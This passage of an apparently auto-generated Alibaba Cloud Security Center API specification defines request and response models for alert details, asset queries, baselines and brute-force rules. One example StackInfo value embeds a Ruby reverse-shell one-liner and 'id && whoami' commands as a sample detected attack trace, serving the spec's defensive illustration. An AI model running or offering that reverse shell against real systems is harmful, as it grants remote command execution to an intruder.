> To query the details of an alert event, you must provide the unique identifier of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the identifier.', example='9f62555666f177aa84ee1eaf465a****', position='Query'),
  from: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeAlarmEventDetailResponseBody = {
  data?: {
    alarmEventAliasName?: string(name='AlarmEventAliasName', description='The name of the alert event.', example='Login with unusual location'),
    alarmEventDesc?: string(name='AlarmEventDesc', description='The description of the alert event.', example='The detection model finds that self-mutation is running on your server. A self-mutation Trojan is a Trojan horse program with self-mutation function. It will change its hash or copy a large number of itself to different paths, and run in the background to avoid cleaning.'),
    alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.

> To query the details of an alert event, you must provide the unique identifier of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the identifier.', example='9f62555666f177aa84ee1eaf465a****'),
    appName?: string(name='AppName', description='The name of the container application.', example='app:msdp-uat-service'),
    canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    causeDetails?: [ 
      {
        key?: string(name='Key', description='The key that is used to trace the alert event.', example='842e314e69b1a2c45d5c1a2f88a16***'),
        value?: [ 
          {
            name?: string(name='Name', description='The name of the field that displays the tracing information.', example='sshd'),
            type?: string(name='Type', description='The type of the field that displays the tracing information. Valid values:

*   **text**
*   **html**', example='html'),
            value?: string(name='Value', description='The value of the field that displays the tracing information.', example='<p>under a certain small probability, yundun may mistakenly judge the repeated attempts caused by the administrator forgetting or entering the wrong password as successful blasting. Please check according to the account number and time shown in the alarm details. Once it is confirmed that it is not the initiative of the administrator, it is recommended to immediately block the IP, and you can open it at the same time<a href="https://yundun.console.aliyun.com/?p=pam">PAM</a>, hosting host login password, improving remote connection efficiency and security control ability, and according to<a href="https://click.aliyun.com/m/1000226086/">best practice of ECS account security protection</a>Modify login password and convergence asset.</p>↵'),
          }
        ](name='Value', description='The value that is used to trace the alert event.'),
      }
    ](name='CauseDetails', description='An array consisting of the cause of the alert event, which can be used to trace the alert event.'),
    containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled.', example='true'),
    containerId?: string(name='ContainerId', description='The ID of the container application.', example='container_1606995441910_394868_01_000***'),
    containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='cadb7a725641'),
    containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='jenkins/jenkins:latest'),
    dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_***'),
    endTime?: long(name='EndTime', description='The timestamp when the alert event ends. Unit: milliseconds.', example='1542366542000'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='172.25.30.**'),
    k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c562cf0d68e9749ee9fe544a7ab2f****'),
    k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='TestK8sCluser'),
    k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='sit-saic-trip'),
    k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0l***'),
    k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='cn-hangzhou.10.188.139.**'),
    k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
    level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    solution?: string(name='Solution', description='The solution to the alert event.', example='An invalid logon source IP has been detected. If you recognize this logon attempt, we recommend that you add the current logon source IP to the valid logon source IP list to avoid future alerts. If you do not recognize this logon attempt, we recommend that you modify the password.'),
    startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1542378601000'),
    type?: string(name='Type', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception', example='Webshell'),
    uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The details of the alert event.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7EA50837-2F0B-5BCC-AB61-4968D88D75AD'),
}

model DescribeAlarmEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventDetailResponseBody(name='body'),
}

async function describeAlarmEventDetail(request: DescribeAlarmEventDetailRequest): DescribeAlarmEventDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAlarmEventDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAlarmEventStackInfoRequest {
  eventName: string(name='EventName', description='The name of the event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of events.', example='Mining program', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  uniqueInfo: string(name='UniqueInfo', description='The ID of the alert event.', example='1fbe8d16727f61d1478a674d6fa0****', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='18b7336e-d469-473b-af83-8e5420f9****', position='Query'),
}

model DescribeAlarmEventStackInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
  stackInfo?: string(name='StackInfo', description='The stack information of the alert details.', example='\\[ { "child": \\[ { "child": \\[ { "child": \\[ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "\\[3033]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": \\[ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "\\[3035]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\"id && whoami\\"", "proc_path": "/bin/bash", "pid": "\\[3022]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\"0.0.0.0\\\\",\\\\"1111\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\"r\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": \\[ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]'),
}

model DescribeAlarmEventStackInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventStackInfoResponseBody(name='body'),
}

async function describeAlarmEventStackInfo(request: DescribeAlarmEventStackInfoRequest): DescribeAlarmEventStackInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAlarmEventStackInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAllEntityRequest {
}

model DescribeAllEntityResponseBody = {
  entityList?: [ 
    {
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='abc'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='172.19.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='101.132.XX.XX'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**', example='windows'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='EntityList', description='An array that consists of servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllEntityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllEntityResponseBody(name='body'),
}

async function describeAllEntity(request: DescribeAllEntityRequest): DescribeAllEntityResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAllEntity', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAllGroupsRequest {
  lang?: string(name='Lang', description='The natural language of the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeAllGroupsResponseBody = {
  count?: int32(name='Count', description='The total number of server groups.', example='2'),
  groups?: [ 
    {
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: default group
*   **1**: other groups', example='1'),
      groupId?: int32(name='GroupId', description='The ID of the server group.', example='8834224'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='abc'),
    }
  ](name='Groups', description='The grouping information about the servers.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllGroupsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllGroupsResponseBody(name='body'),
}

async function describeAllGroups(request: DescribeAllGroupsRequest): DescribeAllGroupsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAllGroups', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAllImageBaselineRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeAllImageBaselineResponseBody = {
  imageBaselines?: {
    baselineClassList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the baseline type.', example='Identity authentication'),
        baselineNameList?: [ 
          {
            alias?: string(name='Alias', description='The alias of the baseline.', example='Identity authentication'),
            baselineItemList?: [ 
              {
                alias?: string(name='Alias', description='The alias of the baseline check item.', example='Ensure that no accounts use the same Hash password.'),
                classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
                itemKey?: string(name='ItemKey', description='The key of the name for the baseline check item.', example='duplicate_pwd_hash'),
                nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
              }
            ](name='BaselineItemList', description='The information about the baseline check item.'),
            classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
            nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
          }
        ](name='BaselineNameList', description='The information about the baseline.'),
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
      }
    ](name='BaselineClassList', description='An array that consists of baseline types.'),
  }(name='ImageBaselines', description='The baselines that are used in image baseline checks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to query logs and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model DescribeAllImageBaselineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllImageBaselineResponseBody(name='body'),
}

async function describeAllImageBaseline(request: DescribeAllImageBaselineRequest): DescribeAllImageBaselineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAllImageBaseline', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  id?: long(name='Id', description='The ID of the defense rule.

> You can call the [DescribeAntiBruteForceRules](~~DescribeAntiBruteForceRules~~) operation to query the IDs of defense rules.', example='1141****', position='Query'),
  name?: string(name='Name', description='The name of the rule.', example='testName', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.69.XX.XX', position='Query'),
}

model DescribeAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  rules?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the rule was created. Unit: milliseconds.', example='1669800181000'),
      defaultRule?: boolean(name='DefaultRule', description='Indicates whether the defense rule is the default rule. Valid values:

*   **true**: The defense rule is the default rule.
*   **false**: The defense rule is not the default rule.

> The default rule takes effect on all servers that are not protected by defense rules against brute-force attacks.', example='true'),
      enableSmartRule?: boolean(name='EnableSmartRule', description='This parameter is deprecated.', example='false'),
      failCount?: int32(name='FailCount', description='The threshold of logon failures that is specified in the defense rule.', example='15'),
      forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes.', example='360'),
      id?: long(name='Id', description='The ID of the defense rule.', example='1629'),
      machineCount?: int32(name='MachineCount', description='The number of servers to which the defense rule is applied.', example='3'),
      name?: string(name='Name', description='The name of the defense rule.', example='AntiBruteForceRule01'),
      span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. If **Span** is set to 10, the defense rule takes effect when the logon failures measured within 10 minutes reaches the specified threshold. The IP address of attackers cannot be used to log on to the server in the specified period of time.', example='10'),
      uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of servers to which the defense rule is applied.'),
    }
  ](name='Rules', description='An array that consists of the details of the defense rule.'),
}

model DescribeAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAntiBruteForceRulesResponseBody(name='body'),
}

async function describeAntiBruteForceRules(request: DescribeAntiBruteForceRulesRequest): DescribeAntiBruteForceRulesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAntiBruteForceRules', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAppVulScanCycleRequest {
}

model DescribeAppVulScanCycleResponseBody = {
  cycle?: string(name='Cycle', description='The scan cycle for application vulnerabilities.

*   1week
*   2weeks
*   3days', example='1week'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='934E6D2A-0123-5A99-88BA-80DC27634E22'),
}

model DescribeAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAppVulScanCycleResponseBody(name='body'),
}

async function describeAppVulScanCycle(request: DescribeAppVulScanCycleRequest): DescribeAppVulScanCycleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAppVulScanCycle', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='9e6cad93-a379-46fd-a701-9bbf02f4****', position='Query'),
}

model DescribeAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS database
*   **4**: ApsaraDB for MongoDB database
*   **5**: ApsaraDB for Redis database
*   **6**: image
*   **7**: container', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
    bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
    clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent suspends protection for your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='online'),
    clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The number of CPU cores.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='1603863599000'),
    diskInfoList?: [ string ](name='DiskInfoList', description='An array that consists of the information about the disk.'),
    flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: yes
*   **1**: no', example='0'),
    groupTrace?: string(name='GroupTrace', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='default'),
    hostName?: string(name='HostName', description='The name of the host.', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='192.168.XX.XX'),
    ipList?: [ string ](name='IpList', description='The IP addresses of the server.'),
    kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList', description='The Media Access Control (MAC) addresses.'),
    mem?: int32(name='Mem', description='The memory size of the server. Unit: GB.', example='32'),
    memory?: long(name='Memory', description='The memory size of the server. Unit: MB.', example='512'),
    os?: string(name='Os', description='The operating system type of the server.', example='linux'),
    osDetail?: string(name='OsDetail', description='The operating system version of the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The name of the operating system.', example='-'),
    region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou-dg-a01'),
    regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The operating system information about the server.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The tag that is added to the server.', example='InternetIp'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The asset details.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39031E31-6BBA-5C99-A870-D807E78918CD'),
}

model DescribeAssetDetailByUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidResponseBody(name='body'),
}

async function describeAssetDetailByUuid(request: DescribeAssetDetailByUuidRequest): DescribeAssetDetailByUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAssetDetailByUuid', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAssetDetailByUuidsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='资源目录成员账号主账号ID。
>调用[DescribeMonitorAccounts](~~DescribeMonitorAccounts~~)接口可以获取该参数。', example='127608589417****', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of the ECS instances. Separate multiple UUIDs with commas (,).', example='0687b17f-2a36-4e5****,0687b17f-2a36-4e****', position='Query'),
}

model DescribeAssetDetailByUuidsResponseBody = {
  assetList?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset.

The value is fixed as **0**, which indicates ECS instances.', example='0'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **online**
*   **offline**', example='online'),
      flag?: int32(name='Flag', description='The type of the asset by source. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: light-weight assets.', example='0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', description='The name of the ECS instance.', example='TestInstanceName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the ECS instance.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the ECS instance.', example='192.168.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the ECS instance.

>  If the ECS instance has a public IP address, the value of this parameter is the public IP address of the ECS instance. If the ECS instance does not have a public IP address, the value of this parameter is the private IP address of the ECS instance.', example='10.10.XX.XX'),
      os?: string(name='Os', description='The operating system of the ECS instance.', example='Linux'),
      osName?: string(name='OsName', description='The name of the operating system run by the ECS instance.', example='CentOS 7.6 64-bit'),
      region?: string(name='Region', description='The region in which the ECS instance resides.', example='cn-guangzhou'),
      regionId?: string(name='RegionId', description='The region in which the ECS instance resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-shanghai'),
      regionName?: string(name='RegionName', description='The name of the region in which the ECS instance resides.', example='cn-shenzhen'),
      uuid?: string(name='Uuid', description='The UUID of the ECS instance.', example='2a98f149-0256-414c-a29a-a69f8a75****'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC).', example='13231-331331'),
    }
  ](name='AssetList', description='An array that consists of the details of the ECS instances.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='92016EC8-D52D-49D8-9FF7-9EA340A950B9'),
}

model DescribeAssetDetailByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidsResponseBody(name='body'),
}

async function describeAssetDetailByUuids(request: DescribeAssetDetailByUuidsRequest): DescribeAssetDetailByUuidsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAssetDetailByUuids', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAssetSummaryRequest {
}

model DescribeAssetSummaryResponseBody = {
  assetsSummary?: {
    totalAssetAllRegion?: int32(name='TotalAssetAllRegion', example='2064'),
    totalCoreAllRegion?: int32(name='TotalCoreAllRegion', example='3200'),
    totalCoreNum?: int32(name='TotalCoreNum', example='1022'),
  }(name='AssetsSummary'),
  requestId?: string(name='RequestId', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribeAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetSummaryResponseBody(name='body'),
}

async function describeAssetSummary(request: DescribeAssetSummaryRequest): DescribeAssetSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAssetSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAssetsSecurityEventSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='cc58f827d893f4d7fb3e34b5d4395****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query on containers. Valid values:

*   **instanceId**: the ID of the container instance
*   **clusterId**: the ID of the cluster
*   **regionId**: the region ID of the container
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image repository
*   **imageDigest**: the digest of the image
*   **ClusterType**: the type of the cluster
*   **hostIp**: the public IP address
*   **pod**: the pod
*   **podIp**: the IP address of the pod
*   **containerId**: the ID of the container
*   **vulStatus**: whether vulnerabilities are detected on the container
*   **alarmStatus**: whether alerts are generated for the container
*   **riskStatus**: whether risks are detected on the container
*   **riskLevel**: the risk level of the container
*   **containerScope**: the type of the container', example='clusterName', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query on containers.', example='arms-prom-operator', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.108.XX.XX', position='Query'),
}

model DescribeAssetsSecurityEventSummaryResponseBody = {
  assets?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **namespace**
*   **clusters**
*   **applications**
*   **pods**
*   **containers**
*   **images**
*   **hosts**', example='namespace'),
      riskCount?: long(name='RiskCount', description='The number of potential risky assets.', example='16'),
      totalCount?: long(name='TotalCount', description='The total number of assets.', example='30'),
    }
  ](name='Assets', description='An array that consists of risk information about containers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model DescribeAssetsSecurityEventSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetsSecurityEventSummaryResponseBody(name='body'),
}

async function describeAssetsSecurityEventSummary(request: DescribeAssetsSecurityEventSummaryRequest): DescribeAssetsSecurityEventSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAssetsSecurityEventSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAttachRecordsRequest {
  applicationId: string(name='ApplicationId', description='The application group ID.', example='64b8b994563c306b4fed****', position='Query'),
  ecsUUIDList?: [ string ](name='EcsUUIDList', description='The UUIDs of ECS instances to be queried.', position='Query'),
}

model DescribeAttachRecordsResponseBody = {
  accessList?: [ 
    {
      attachState?: long(name='AttachState', description='The status of connecting applications on the ECS instance to the application protection feature. Valid values:

*   **0**: All applications are connected to the application protection feature.
*   **1**: Partial applications are connected to the application protection feature.
*   **2**: Applications failed to be connected to the application protection feature.
*   **3**: Applications are being connected to the application protection feature.
*   **4**: Applications are not connected to the application protection feature.', example='0'),
      attachSwitch?: string(name='AttachSwitch', description='Indicates whether automatic protection is enabled for the applications on the ECS instance. Valid values:

*   **ON**: Automatic protection is enabled for the applications on the ECS instance.
*   **OFF**: Automatic protection is disabled for the applications on the ECS instance.', example='ON'),
      ecsUUID?: string(name='EcsUUID', description='The UUID of the ECS instance.', example='cd405430-c027-4937-8398-10152dac****'),
      installMsg?: string(name='InstallMsg', description='The message that shows the results of installing the RASP agent on the ECS instance.', example='success'),
      installState?: long(name='InstallState', description='The status of installing the RASP agent on the ECS instance to enable automatic application connection. Valid values:

*   **0**: installed
*   **1**: installing
*   **2**: installation failed
*   **3**: installation timeout
*   **4**: uninstalled
*   **5**: uninstalling
*   **6**: uninstallation failed
*   **7**: uninstallation timeout', example='0'),
    }
  ](name='AccessList', description='The results of automatically connecting applications on the ECS instance to the application protection feature.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model DescribeAttachRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAttachRecordsResponseBody(name='body'),
}

async function describeAttachRecords(request: DescribeAttachRecordsRequest): DescribeAttachRecordsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAttachRecords', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAttackAnalysisDataRequest {
